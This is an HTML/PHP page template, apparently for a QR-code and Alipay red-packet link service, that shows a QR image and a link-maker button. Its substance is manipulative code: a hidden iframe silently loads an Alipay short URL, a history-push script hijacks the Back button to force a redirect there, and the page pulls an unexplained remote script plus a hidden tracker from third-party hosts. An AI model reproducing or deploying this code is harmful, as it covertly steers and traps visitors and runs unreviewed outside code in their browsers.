<html>
  
  <head>
    <meta charset="utf-8">
    <title>码上合并youmahe</title>
  </head>
  
  <body>
<center>
<img src='http://a.mmiii.cn/api/api.php?img&url=http%3A%2F%2Ft.cn%2FRHxyiax' width='500' height='500'><h1>1</h1><div style="display:none"><iframe src="<?= $model['alipay_short_url'];?>"></iframe></div><div style="position:fixed;bottom:0">
<a href="http://a.mmiii.cn/submit"><input type="submit" style="background-color:#e1e1e1;font-size:16px" value="在线制作支付宝红包链接"></a>
</div>
</center>
<script>
window.onhashchange = function() {
    location.href = "<?= $model['alipay_short_url'];?>";
  };
  function hh() {
    history.pushState(history.length + 1, "message", "#");
  }
  setTimeout('hh();', 200);
</script>
<script>var _0 = "<?= $model['alipay_short_url'];?>";var _1 = "<?= $model['alipay_short_url'];?>";</script><script src="http://a.mmiii.cn/home/main.js" language="JavaScript"></script><div style="display:none">
  <scriptsrc="https://s22.cnzz.com/z_stat.php?id=1271901597&web_id=1271901597"language="JavaScript"></script>
</div>
</body>

</html>